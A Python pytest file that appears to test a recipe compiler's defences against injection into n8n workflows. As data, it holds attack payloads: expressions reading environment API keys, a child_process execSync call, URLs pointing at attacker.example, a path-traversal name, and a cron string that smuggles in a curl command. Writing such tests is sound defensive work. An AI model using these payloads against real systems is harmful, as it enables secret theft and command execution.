"""Recipe compiler: injection corpus (task 13.4/13.6).

The automation builder takes free text from a `builder`-role user and turns it
into a workflow that n8n executes with `$env` in scope. That is the highest-
value injection target the platform has, so this file attacks it directly: the
question each case asks is "can a crafted recipe make the compiler emit a node
that reaches somewhere other than Fleet's own `/v1/service/*`, or make user
text execute as JavaScript?".

Every case must be rejected at validation or compile time. A case that merely
"looks harmless in the output" is not enough — the assertions check the emitted
workflow, not just that no exception escaped.
"""

from __future__ import annotations

import json

import pytest
from fleet_api.recipes.compiler import ALLOWED_NODE_TYPES, compile_recipe
from fleet_api.recipes.schema import Recipe, RecipeValidationError
from pydantic import ValidationError


def _build(steps: list[dict], **overrides: object) -> Recipe:
    payload: dict[str, object] = {
        "name": "attack-case",
        "trigger": {"type": "manual"},
        "steps": steps,
    }
    payload.update(overrides)
    return Recipe.model_validate(payload)


# --- 1. A recipe may not name a destination -------------------------------


@pytest.mark.parametrize(
    "params",
    [
        {"sql": "SELECT 1", "url": "http://attacker.example/steal"},
        {"sql": "SELECT 1", "method": "GET"},
        {"sql": "SELECT 1", "headers": {"X-Fleet-Api-Key": "leak"}},
    ],
)
def test_extra_params_cannot_redirect_a_node(params: dict) -> None:
    with pytest.raises(ValidationError):
        _build([{"type": "action", "id": "q1", "action": "pg.query", "params": params}])


def test_unlisted_action_is_rejected() -> None:
    with pytest.raises(ValidationError):
        _build(
            [
                {
                    "type": "action",
                    "id": "x1",
                    "action": "http.request",
                    "params": {"url": "http://attacker.example"},
                }
            ]
        )


def test_code_node_cannot_be_requested() -> None:
    with pytest.raises(ValidationError):
        _build([{"type": "action", "id": "x1", "action": "code.run", "params": {"js": "1"}}])


# --- 2. User text may not become an n8n expression ------------------------


@pytest.mark.parametrize(
    "payload",
    [
        "={{ $env.OPENAI_API_KEY }}",
        "={{ require('child_process').execSync('id') }}",
        "prefix {{ $env.FLEET_API_KEY }} suffix",
        "{{ $json }}",
        "}}{{ $env.LITELLM_MASTER_KEY }}{{",
        "={{ $('pg.query (q1)').item.json }}",
    ],
)
def test_expression_payloads_are_rejected_in_action_params(payload: str) -> None:
    with pytest.raises((ValidationError, RecipeValidationError)):
        _build(
            [
                {
                    "type": "action",
                    "id": "n1",
                    "action": "http.notify",
                    "params": {"title": "t", "message": payload},
                }
            ]
        )


@pytest.mark.parametrize("field", ["left", "right"])
def test_expression_payloads_are_rejected_in_a_condition(field: str) -> None:
    step = {
        "type": "condition",
        "id": "c1",
        "left": "1",
        "operator": "eq",
        "right": "1",
        "then_steps": [
            {"type": "action", "id": "n1", "action": "http.notify",
             "params": {"title": "t", "message": "m"}}
        ],
        "else_steps": [],
    }
    step[field] = "={{ $env.OPENAI_API_KEY }}"
    with pytest.raises((ValidationError, RecipeValidationError)):
        _build([step])


def test_quote_in_user_text_cannot_break_out_of_the_json_literal() -> None:
    """A `"` or `\\` in a legitimate value is escaped, so the JS object literal
    the compiler emits still parses as data."""
    recipe = _build(
        [
            {
                "type": "action",
                "id": "n1",
                "action": "http.notify",
                "params": {"title": 'a"b\\c', "message": "m"},
            }
        ]
    )
    workflow = compile_recipe(recipe)
    node = next(n for n in workflow["nodes"] if n["type"] == "n8n-nodes-base.httpRequest")
    body = node["parameters"]["jsonBody"]
    assert json.dumps('a"b\\c') in body
    # The expression's own delimiters appear exactly once each, at the ends.
    assert body.startswith("={{ JSON.stringify({") and body.endswith("}) }}")


# --- 3. Whatever the recipe says, the emitted workflow is Fleet-only ------


def test_every_emitted_node_is_allowlisted_and_fleet_targeted() -> None:
    recipe = _build(
        [
            {"type": "action", "id": "q1", "action": "pg.query", "params": {"sql": "SELECT 1"}},
            {
                "type": "condition",
                "id": "c1",
                "left": "{{steps.q1.row_count}}",
                "operator": "gt",
                "right": "0",
                "then_steps": [
                    {
                        "type": "action",
                        "id": "e1",
                        "action": "email.send",
                        "params": {"to": "a@fleet.local", "subject": "s", "body": "b"},
                    }
                ],
                "else_steps": [
                    {
                        "type": "action",
                        "id": "s1",
                        "action": "slack.post",
                        "params": {"channel": "#weekly-summary", "text": "t"},
                    }
                ],
            },
        ]
    )
    workflow = compile_recipe(recipe)
    for node in workflow["nodes"]:
        assert node["type"] in ALLOWED_NODE_TYPES
        if node["type"] == "n8n-nodes-base.httpRequest":
            assert node["parameters"]["url"].startswith(
                "={{ $env.FLEET_API_BASE_URL }}/v1/service/"
            )


def test_a_write_external_step_on_either_branch_still_routes_at_the_gated_endpoint() -> None:
    """Rule 3 is enforced by the endpoint, not the branch: an `email.send`
    reached only through the false branch still compiles to `/v1/service/
    email-send`, which queues an approval instead of sending."""
    recipe = _build(
        [
            {
                "type": "condition",
                "id": "c1",
                "left": "1",
                "operator": "eq",
                "right": "2",
                "then_steps": [],
                "else_steps": [
                    {
                        "type": "action",
                        "id": "e1",
                        "action": "email.send",
                        "params": {"to": "a@fleet.local", "subject": "s", "body": "b"},
                    }
                ],
            }
        ]
    )
    assert recipe.has_write_external is True
    workflow = compile_recipe(recipe)
    email_node = next(n for n in workflow["nodes"] if n["name"] == "email.send (e1)")
    assert email_node["parameters"]["url"].endswith("/v1/service/email-send")


def test_recipe_name_cannot_traverse_the_workflow_namespace() -> None:
    with pytest.raises(ValidationError):
        _build(
            [{"type": "action", "id": "q1", "action": "pg.query", "params": {"sql": "SELECT 1"}}],
            name="../../weekly-summary",
        )


def test_cron_field_cannot_carry_a_shell_or_expression_payload() -> None:
    with pytest.raises(ValidationError):
        _build(
            [{"type": "action", "id": "q1", "action": "pg.query", "params": {"sql": "SELECT 1"}}],
            trigger={"type": "schedule", "cron": "0 8 * * 1; curl http://attacker.example"},
        )
